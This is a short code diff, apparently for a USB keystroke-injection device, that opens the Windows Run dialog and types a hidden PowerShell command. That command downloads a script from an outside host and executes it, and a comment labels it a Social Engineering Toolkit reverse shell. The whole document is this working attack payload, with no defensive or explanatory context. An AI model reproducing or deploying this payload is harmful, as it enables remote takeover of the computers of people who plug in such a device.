@@ -1,0 +1,5 @@
+# Windows Key + R
+payload1 = [usb.RUN]
+# Download and Execute Social Engineering Toolkit Powershell Reverse Shell
+payload2 = usb.get_sequence('powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString(\'http://example.org/shell.txt\')"')
+payload2 += [usb.ENTER]
